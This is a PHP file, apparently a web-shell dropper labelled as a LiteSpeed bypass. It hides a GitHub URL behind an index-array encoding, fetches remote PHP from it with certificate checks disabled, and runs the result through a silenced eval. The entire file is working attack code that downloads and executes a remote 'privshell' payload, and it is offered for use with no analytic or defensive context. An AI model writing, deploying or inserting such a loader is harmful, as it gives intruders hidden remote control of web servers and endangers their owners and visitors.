<?php

/*
    Mirorlite bypass Litespeed
    allcode copyright by hudaxcode / hengkerbarbar
*/

$aNAx=array_merge(range('a','z'),range('A','Z'),range('0','9'),['.',':','/','_','-','?','=']);
$cbnN=[7, 19, 19, 15, 18, 63, 64, 64, 17, 0, 22, 62, 6, 8, 19, 7, 20, 1, 20, 18, 4, 17, 2, 14, 13, 19, 4, 13, 19, 62, 2, 14, 12, 64, 13, 4, 20, 17, 14, 3, 8, 4, 64, 7, 23, 2, 64, 17, 4, 5, 18, 64, 7, 4, 0, 3, 18, 64, 12, 0, 8, 13, 64, 15, 17, 8, 21, 18, 7, 4, 11, 11, 64, 7, 4, 13, 6, 10, 4, 17, 1, 0, 17, 1, 0, 17, 62, 15, 7, 15];
$pmXa='';foreach($cbnN as $qLvw){$pmXa.=$aNAx[$qLvw];}
$RcRI = "$pmXa";
function zrwR($undefined){$UWOb=curl_init();curl_setopt($UWOb,CURLOPT_URL,$undefined);curl_setopt($UWOb,CURLOPT_RETURNTRANSFER,true);curl_setopt($UWOb,CURLOPT_SSL_VERIFYPEER,false);curl_setopt($UWOb,CURLOPT_SSL_VERIFYHOST,false);$XRcN=curl_exec($UWOb);curl_close($UWOb);return gzcompress(gzdeflate(gzcompress(gzdeflate(gzcompress(gzdeflate($XRcN))))));}
@eval("?>".gzinflate(gzuncompress(gzinflate(gzuncompress(gzinflate(gzuncompress(zrwR($RcRI))))))));
?>